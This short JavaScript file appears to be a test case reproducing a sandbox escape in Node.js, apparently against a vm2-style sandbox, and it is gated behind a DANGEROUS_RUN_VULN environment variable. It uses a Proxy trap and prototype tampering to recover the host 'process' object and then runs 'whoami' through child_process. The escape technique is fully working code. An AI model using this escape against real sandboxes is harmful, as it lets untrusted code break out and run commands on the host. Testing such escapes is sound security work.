if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (
		error.message ===
		"Cannot read properties of undefined (reading 'mainModule')"
	) {
		process.exit(82);
	}

	process.exit(1);
});

var process;
try {
	Object.defineProperty(Buffer.from(""), "", {
		value: new Proxy(
			{},
			{
				getPrototypeOf(target) {
					delete this.getPrototypeOf;
					Object.defineProperty(Object.prototype, "get", {
						get() {
							delete Object.prototype.get;
							Function.prototype.__proto__ = null;
							throw (f) => f.constructor("return process")();
						},
					});
					return Object.getPrototypeOf(target);
				},
			},
		),
	});
} catch (e) {
	process = e(() => {});
}
process.mainModule
	.require("child_" + "process")
	.execSync("whoami")
	.toString();
